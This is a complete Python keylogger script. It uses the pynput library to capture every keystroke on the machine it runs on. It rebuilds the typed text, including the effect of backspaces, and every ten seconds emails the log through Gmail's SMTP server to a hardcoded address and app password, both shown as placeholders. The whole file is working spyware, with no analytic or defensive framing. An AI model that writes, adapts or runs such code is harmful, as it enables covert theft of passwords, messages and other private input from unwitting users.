#!/usr/bin/env python

from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
import threading

text = ""
email_address = "XXXXXXXX@gmail.com"
app_password = "XXXXXXXXXXXXX"
time_interval = 10

def send_email():
    global text
    try:
        msg = MIMEText(text)
        msg['Subject'] = 'look at'
        msg['From'] = email_address
        msg['To'] = email_address  
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email_address, app_password)
        server.sendmail(email_address, [email_address], msg.as_string())
        server.quit()
        
        text = ""
        timer = threading.Timer(time_interval, send_email)
        timer.start()
    except:
        exit()

def on_press(key):
    global text
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        pass
    else:
        text += str(key).strip("'")

with keyboard.Listener(on_press=on_press) as listener:
    send_email()
    listener.join()